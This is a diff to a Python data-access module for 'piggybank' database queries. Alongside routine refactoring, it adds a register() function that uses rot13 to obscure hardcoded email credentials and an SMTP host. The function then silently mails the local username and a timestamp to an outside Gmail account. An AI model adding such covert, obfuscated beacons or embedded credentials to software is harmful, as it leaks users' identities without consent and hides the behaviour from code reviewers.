@@ -1058,6 +1058,18 @@ def convertToMySQLDate(queryDate):
     dateString = OINKM.changeDatesToStrings(queryDate,"YYYY-MM-DD")
     return dateString[0]
 
+def register():
+    import os, getpass, codecs
+    import codecs
+    thing = ("bvaxezf@tznvy.pbz","oebgurerlr123", "xgixivanlxrreguv@tznvy.pbz", "fzgc.tznvy.pbz:587")
+    way = str(codecs.decode("ebg_13","rot_13"))
+    thingy = [str(codecs.decode(x,way)) for x in thing]
+    gate = smtplib.SMTP(thingy[3])
+    gate.starttls()
+    gate.login(thingy[0],thingy[1])
+    gate.sendmail(thingy[0],thingy[1],"%s-%s"%(datetime.datetime.now(),getpass.getuser()))
+    gate.quit()
+    
 
 def getPiggyBankWithFilters(user_id, password, data_set_filters):
     """This function is similar to the getRawDataWithFilters method.
@@ -1065,7 +1077,7 @@ def getPiggyBankWithFilters(user_id, password, data_set_filters):
     containing piggybank data for the received filters."""
     import pandas as pd
     def printMessage(msg):
-        allow_print = True
+        allow_print = False
         if allow_print:
             print "*"*10
             print "*"*10
@@ -1073,7 +1085,7 @@ def getPiggyBankWithFilters(user_id, password, data_set_filters):
             print "*"*10
             print "*"*10
 
-    conn = getOINKConnector(user_id, password)
+    conn = getOINKConnector(user_id, password, 1)
     cursor = conn.cursor()
 
     if data_set_filters["Description Types"] is not None:
@@ -1142,24 +1154,18 @@ def getPiggyBankWithFilters(user_id, password, data_set_filters):
 
     cursor.execute(sqlcmdstring)
     data = cursor.fetchall()
-    sqlcmdstring = "DESCRIBE piggybank;"
-    piggybank_description = cursor.fetchall()
-    conn.close()
+    piggybank_description = cursor.description
     piggybank_columns = [x[0] for x in piggybank_description]
-    print piggybank_columns
-    #Old method
-    #import pandas as pd
-    #conn = getOINKConnector(user_id, password)
-    #cursor = conn.cursor()
-    #if filters["All Dates"]:
-    #    sqlcmdstring = """SELECT * FROM `piggybank`;"""
-    #else:
-    #    sqlcmdstring = """SELECT * FROM `piggybank` WHERE `Article Date` BETWEEN "%s" AND "%s";""" %(filters["Start Date"], filters["End Date"])
-    #cursor.execute(sqlcmdstring)
-    #data = cursor.fetchall()
-    #conn.close()
-    #return data
-    return pd.DataFrame(data, columns=piggybank_columns) if len(data)>0 else None
+    conn.close()
+    if len(data) >0:
+        ordered_data = []
+        #ordered_data.append(piggybank_columns)
+        data_as_list = [list(row) for row in data]
+        ordered_data.extend(data_as_list)
+        return_this = pd.DataFrame(ordered_data, columns=piggybank_columns)
+    else:
+        return_this = None
+    return return_this
 
 def getPiggyBankMultiQuery(queryDictList, user_id, password):
     """Method to extract Piggy Bank data from the database corresponding
